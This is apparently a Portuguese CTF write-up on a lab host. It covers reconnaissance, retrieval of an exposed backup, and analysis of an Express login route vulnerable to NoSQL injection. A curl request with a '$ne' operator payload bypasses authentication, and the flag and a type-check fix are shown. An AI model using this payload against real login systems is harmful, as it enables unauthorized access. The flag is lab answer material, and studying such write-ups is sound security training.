# WriteUp — Type Confusion / NoSQL Injection
**Alvo:** `10.10.0.30`  
**Data:** 2026-08-25  
**Stack:** Node.js + Express + MongoDB (Mongoose 8.4.0)

---

## Reconhecimento

```bash
ping -c 3 10.10.0.30
# TTL=253 → Linux, ~2 hops

nmap -sT -T4 --top-ports 1000 10.10.0.30
# Resultado: 80/tcp open http

curl -sv http://10.10.0.30/
# X-Powered-By: Express
# HTTP/1.1 404 Not Found
```

---

## Enumeração

```bash
curl -s http://10.10.0.30/robots.txt
# /backup.zip

curl -o backup.zip http://10.10.0.30/backup.zip
unzip -l backup.zip
```

**Conteúdo do backup:**
```
webapp/index.js         ← código principal
webapp/database/User.js ← model Mongoose
webapp/package.json
webapp/entrypoint.sh
webapp/Dockerfile
```

---

## Análise do Código

### Rota vulnerável — `index.js`
```js
app.post('/auth/login', async(req,res) => {
    const { email, password } = req.body;
    // SEM validação de tipo!
    const user = await User.find({ email, password });

    if(user && user.length > 0) {
        return res.json({ FLAG });
    }
})
```

### Vulnerabilidade
`req.body` é parsed como JSON e passado **diretamente** ao `User.find()`.  
Se `email` ou `password` forem **objetos**, o Mongoose repassa o operador ao MongoDB → **NoSQL Injection via Type Confusion**.

---

## Exploit

```bash
curl -s -X POST http://10.10.0.30/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": {"$ne": null}, "password": {"$ne": null}}'
```

`{"$ne": null}` → MongoDB retorna todos os docs onde campo ≠ null → bypass total de autenticação.

---

## Flag

```
hackingclub{typ3_c0nfus10n_4nd_n0sql1_t0_byp455_4uth3nt1c4t10n_syst3m}
```

---

## Fix

```js
if (typeof email !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: "Invalid input types" });
}
```

---

## Referências
- [OWASP: Testing for NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
- [Mongoose Docs: Query Operators](https://mongoosejs.com/docs/queries.html)
